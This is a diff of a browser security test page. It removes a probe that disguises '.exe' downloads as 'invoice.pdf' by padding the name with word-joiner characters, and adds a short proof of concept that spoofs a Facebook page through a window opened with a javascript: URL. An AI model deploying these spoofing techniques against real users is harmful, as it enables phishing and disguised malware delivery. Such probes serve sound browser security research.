@@ -1,39 +1,7 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>word joiner download probe</title>
-<style>
-  body { font: 16px system-ui, sans-serif; margin: 20px; }
-  button, input { font: inherit; margin: 4px; }
-  pre { white-space: pre-wrap; border-top: 1px solid #999; padding-top: 10px; }
-</style>
-<h1>word joiner download probe</h1>
-<p>Run </p>
-<label>Server <input id="server" size="40" value="http://127.0.0.1:8767"></label><br>
-<label>Prefix <input id="prefix" size="28" value="invoice.pdf"></label>
-<label>Joiners <input id="spaces" size="5" value="220"></label>
-<label>Suffix <input id="suffix" size="8" value=".exe"></label><br>
-<button id="download">Download word-joiner filename</button>
-<button id="downloadNoFallback">Download without ASCII fallback</button>
-<pre id="log"></pre>
+<a href="https://www.facebook.com:1234" target="ux" onclick="setTimeout('spoof()',200)"><h1>click here</h1></a>
 <script>
-const logEl = document.getElementById('log');
-function log(message) {
-  logEl.textContent += `${new Date().toISOString()} ${message}\n`;
+function spoof() {
+var t = window.open('javascript:alert(document.domain)','ux');
+t.document.body.innerHTML = '<title>Facebook</title><H1>Spoofing</H1>';
 }
-function download(fallback) {
-  const server = document.getElementById('server').value;
-  const prefix = document.getElementById('prefix').value;
-  const spaces = document.getElementById('spaces').value;
-  const suffix = document.getElementById('suffix').value;
-  const url = `${server}/download?case=custom&prefix=${encodeURIComponent(prefix)}&spaces=${encodeURIComponent(spaces)}&fill=wordjoiner&suffix=${encodeURIComponent(suffix)}&fallback=${fallback ? '1' : '0'}`;
-  const a = document.createElement('a');
-  a.href = url;
-  a.download = '';
-  document.body.append(a);
-  a.click();
-  a.remove();
-  log(url);
-}
-document.getElementById('download').onclick = () => download(true);
-document.getElementById('downloadNoFallback').onclick = () => download(false);
 </script>
